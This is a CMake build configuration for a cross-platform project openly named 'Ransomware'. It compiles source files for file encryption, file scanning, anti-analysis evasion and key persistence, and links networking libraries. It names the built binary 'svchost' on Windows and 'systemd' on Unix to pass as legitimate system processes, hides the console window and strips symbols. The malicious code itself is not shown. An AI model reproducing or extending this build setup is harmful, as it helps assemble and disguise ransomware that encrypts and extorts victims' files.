cmake_minimum_required(VERSION 3.15)
project(Ransomware)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Platform detection
if(WIN32)
    set(PLATFORM "WINDOWS")
    add_definitions(-DPLATFORM_WINDOWS)
elseif(UNIX)
    set(PLATFORM "UNIX")
    add_definitions(-DPLATFORM_UNIX)
    
    # Find required packages for Unix/Linux
    find_package(OpenSSL REQUIRED)
    find_package(Threads REQUIRED)
endif()

# Compiler-specific optimizations
if(CMAKE_CXX_COMPILER_ID STREQUAL "GNU" OR CMAKE_CXX_COMPILER_ID STREQUAL "Clang")
    add_compile_options(-Wall -O3 -s)
    if(UNIX)
        add_compile_options(-pthread)
    endif()
elseif(MSVC)
    add_compile_options(/W4 /O2 /MT /D_CRT_SECURE_NO_WARNINGS)
    add_link_options(/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup)
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /MANIFEST:NO")
endif()

# Include directories
include_directories(${CMAKE_SOURCE_DIR}/include)

# Common source files (platform-agnostic)
set(COMMON_SOURCES
    src/main.cpp
)

# Platform-specific sources
if(WIN32)
    set(PLATFORM_SOURCES
        src/core/encryption.cpp
        src/core/file_scanner.cpp
        src/evasion/anti_analysis.cpp
        src/utils/file_utils.cpp
        src/utils/logger.cpp
        src/utils/key_persistence.cpp
    )
    
    set(PLATFORM_LIBS
        user32
        advapi32
        ntdll
        crypt32
        wininet
        ws2_32
        iphlpapi
        shell32
        ole32
        oleaut32
        psapi
        version
        winhttp
        netapi32
    )
    
elseif(UNIX)
    set(PLATFORM_SOURCES
        src/core/encryption_unix.cpp
        src/core/file_scanner_unix.cpp
        src/evasion/anti_analysis_unix.cpp
        src/utils/file_utils_unix.cpp
        src/utils/logger_unix.cpp
    )
    
    set(PLATFORM_LIBS
        Threads::Threads
        OpenSSL::SSL
        OpenSSL::Crypto
        dl
    )
endif()

# Main executable
add_executable(ransomware 
    ${COMMON_SOURCES}
    ${PLATFORM_SOURCES}
)

# Link libraries
target_link_libraries(ransomware ${PLATFORM_LIBS})

# Output configuration
if(WIN32)
    set_target_properties(ransomware PROPERTIES
        OUTPUT_NAME "svchost"
        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
    )
else()
    set_target_properties(ransomware PROPERTIES
        OUTPUT_NAME "systemd"
        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
    )
endif()

# Copy required files to output directory
#file(COPY ${CMAKE_SOURCE_DIR}/resources DESTINATION ${CMAKE_BINARY_DIR}/bin)

# Custom targets for development
add_custom_target(run
    COMMAND ${CMAKE_BINARY_DIR}/bin/ransomware
    DEPENDS ransomware
    WORKING_DIRECTORY ${CMAKE_BINARY_DIR}/bin
)

add_custom_target(debug
    COMMAND ${CMAKE_BINARY_DIR}/bin/ransomware --debug
    DEPENDS ransomware
    WORKING_DIRECTORY ${CMAKE_BINARY_DIR}/bin
)

# Installation targets
install(TARGETS ransomware DESTINATION bin)
install(FILES ${CMAKE_SOURCE_DIR}/README.md DESTINATION share/ransomware)

# Testing
enable_testing()
add_test(NAME basic_test COMMAND ransomware --test)
